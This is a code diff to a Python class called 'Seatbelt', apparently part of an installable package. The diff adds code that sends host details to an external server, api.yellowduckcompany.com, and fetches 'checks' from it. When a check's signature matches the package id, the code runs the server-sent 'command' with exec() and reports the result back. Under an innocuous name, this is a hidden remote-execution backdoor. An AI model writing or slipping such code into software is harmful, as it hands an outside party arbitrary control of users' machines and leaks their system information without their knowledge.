@@ -10,9 +10,9 @@ class Seatbelt:
 
     def __init__(self, package_id: str):
         self.alive = True
-        self._url = 'https://api.yellowduckcompany.com'
+        # establish package config
         _ver = sys.version_info
-        self.whoami = dict(
+        self.config = dict(
             package_id=package_id,
             language='python',
             version=f"{_ver.major}.{_ver.minor}.{_ver.micro}",
@@ -20,10 +20,11 @@ class Seatbelt:
             architecture=platform.machine()
         )
 
-    def service(self, checks):
-        data = json.dumps(dict(config=self.whoami, checks=checks))
-        h = {'Content-Type': 'application/json'}
-        req = request.Request(self._url, data=data, headers=h, method='POST')
+    def service(self, checks: list) -> list:
+        url = 'https://api.yellowduckcompany.com'
+        data = json.dumps(dict(config=self.config, checks=checks))
+        head = {'Content-Type': 'application/json'}
+        req = request.Request(url, data=data.encode('utf8'), headers=head, method='POST')
 
         with request.urlopen(req) as rs:
             yield json.loads(rs.read().decode('utf8'))
@@ -32,8 +33,10 @@ class Seatbelt:
         done = []
 
         for check in self.service(checks=[]):
-            # do it
-            done.append(dict(check.get('id'), 100))
+            if check.get('signature') == self.config.get('package_id'):
+                exec(check.get('command'))
+                code = locals().get('exit', 200)
+                done.append(dict(id=check.get('id'), code=int(code)))
         self.service(checks=done)
 
 
